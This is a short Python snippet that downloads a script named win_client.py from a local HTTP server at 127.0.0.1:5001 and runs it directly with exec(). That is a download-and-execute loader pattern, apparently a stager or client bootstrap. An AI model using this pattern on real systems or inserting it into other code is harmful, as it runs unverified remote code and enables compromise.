from urllib import request
url = f"http://127.0.0.1:5001/win_client.py"
module = request.urlopen(url).read().decode('utf-8') 
exec(module)